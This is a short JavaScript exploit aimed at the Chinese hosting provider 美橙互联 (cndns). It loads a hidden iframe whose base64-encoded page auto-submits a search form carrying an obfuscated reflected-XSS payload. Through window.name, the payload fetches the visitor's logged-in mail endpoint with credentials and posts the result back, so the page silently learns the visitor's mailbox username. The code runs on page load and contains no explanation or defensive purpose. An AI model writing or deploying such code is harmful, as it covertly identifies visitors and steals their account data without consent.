// 美橙互联  邮箱首页   邮箱 = 用户名

function e(n) {
  if ('cndns' === n.data.source) {
    var e = n.data.d
    if ('10000' == e.code) {
      if (null != e.message.match(/mailbox=(.*?)&/)) {
        var t = {
          valid: !0,
          data: { username: RegExp.$1, mail_entry: e.message },
        }
        let innerHTML = `
        <div class='item'>
          <p class='title'>美橙互联</p>
          <p>邮箱: ${t.data.mail_entry}</p>
          <p>用户名: ${t.data.username}</p>
        </div>
      `
        let dom = document.createElement('div')
        dom.innerHTML = innerHTML

        document.getElementById('content').appendChild(dom)
        console.log(t)
      }
    }
  }
}
function cndns() {
  var d = document.createElement('iframe')
  d.src =
    'data:text/html;base64,PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+Y25kbnM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoJPHA+dGVzdDwvcD4KCTxmb3JtICBuYW1lPSJmb3JtIiBpZD0iZm9ybTEiIG1ldGhvZD0icG9zdCIgYWN0aW9uPSJodHRwczovL3d3dy5jbmRucy5jb20vY24vZG9tYWluL3NlYXJjaC5hc3B4Ij4KCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJiYXRjaCIgaGlkZGVuPSJ0cnVlIiB2YWx1ZT0nIj48ZGV0YWlscyBvcGVuIG9udG9nZ2xlPWV2XHUwMDYxbCh3aW5kb3cubmFtZSk+Jy8+Cgk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZG9tYWlubmFtZSIgaGlkZGVuPSJ0cnVlIiB2YWx1ZT0iIi8+Cgk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZG9tYWluc3VmZml4cyIgaGlkZGVuPSJ0cnVlIiB2YWx1ZT0iLmNvbSUyQy5jb20lMkMubmV0JTJDLnRvcCUyQy5jbiUyQy53YW5nIi8+Cgk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ic2J0eXBlIiBoaWRkZW49InRydWUiIHZhbHVlPSIxIi8+Cgk8L2Zvcm0+CjwvYm9keT4KPHNjcmlwdD4KIAlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9ybTEnKS5zdWJtaXQoKTsKPC9zY3JpcHQ+CjwvaHRtbD4K'
  d.width = 0
  d.height = 0
  d.style.borderWidth = 0
  d.name =
    "\n    fetch('https://www.cndns.com/Ajax/Login.ashx?module=turntomail', {credentials: 'include'})\n    .then(resp => resp.json())\n    .then(function(data){let s = {source: 'cndns', d: data}; window.parent.postMessage(s, '*');})\n  "
  document.documentElement.appendChild(d)
}
window.addEventListener('message', e, !1)

// window.addEventListener('load', function () {
cndns()
// })
